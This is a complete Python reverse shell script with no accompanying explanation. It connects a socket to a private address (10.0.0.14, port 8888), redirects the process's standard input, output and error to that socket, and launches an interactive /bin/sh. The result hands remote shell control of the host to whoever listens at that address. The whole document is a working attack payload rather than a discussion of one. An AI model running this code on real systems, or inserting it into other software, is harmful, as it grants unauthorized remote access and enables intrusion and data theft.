import os, subprocess, socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.14", 8888))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh","-i"])